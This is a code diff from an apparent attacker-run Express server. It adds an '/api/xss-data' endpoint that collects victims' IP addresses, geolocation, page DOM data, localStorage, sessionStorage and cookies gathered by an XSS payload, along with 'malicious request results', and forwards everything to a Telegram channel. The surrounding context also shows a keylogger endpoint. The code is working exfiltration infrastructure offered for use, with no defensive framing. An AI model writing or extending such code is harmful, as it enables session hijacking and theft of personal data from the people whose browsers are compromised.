@@ -324,6 +324,58 @@ app.post('/webhook', async (req, res) => {
     await sendToTelegram(msg);
     res.sendStatus(200);
 });
+// --- XSS DATA ENDPOINT ---
+app.post('/api/xss-data', async (req, res) => {
+    try {
+        const data = req.body;
+        const ip = getClientIp(req);
+        const location = await getLocationFromIp(ip);
+
+        let msg = `🕵️ *XSS Data Capture*\n\n`;
+        msg += `*📍 Location:* ${location.full}\n`;
+        msg += `*📡 IP:* ${ip}\n`;
+        msg += `*🔗 URL:* ${data.visitorInfo?.fullUrl || 'Unknown'}\n`;
+        msg += `*🕐 Time:* ${new Date().toISOString()}\n\n`;
+
+        if (data.xssData) {
+            const x = data.xssData;
+            if (x.dom) {
+                msg += `*📄 DOM Data:*\n`;
+                for (const [key, value] of Object.entries(x.dom)) {
+                    if (typeof value === 'object') {
+                        msg += `  *${key}:* ${JSON.stringify(value, null, 2)}\n`;
+                    } else {
+                        msg += `  *${key}:* ${value}\n`;
+                    }
+                }
+            }
+            if (x.storage) {
+                msg += `\n*💾 Storage Data:*\n`;
+                if (x.storage.localStorage) {
+                    msg += `  *localStorage:* ${JSON.stringify(x.storage.localStorage, null, 2)}\n`;
+                }
+                if (x.storage.sessionStorage) {
+                    msg += `  *sessionStorage:* ${JSON.stringify(x.storage.sessionStorage, null, 2)}\n`;
+                }
+                if (x.storage.cookies) {
+                    msg += `  *🍪 Cookies:* ${x.storage.cookies}\n`;
+                }
+            }
+            if (x.requests) {
+                msg += `\n*🚀 Malicious Request Results:*\n`;
+                for (const [key, value] of Object.entries(x.requests)) {
+                    msg += `  *${key}:* ${JSON.stringify(value, null, 2)}\n`;
+                }
+            }
+        }
+
+        await sendToTelegram(msg);
+        res.json({ success: true });
+    } catch (error) {
+        console.error('XSS data error:', error.message);
+        res.status(500).json({ success: false });
+    }
+});
 
 // --- KEYLOGGER ---
 app.post('/api/keylog', async (req, res) => {
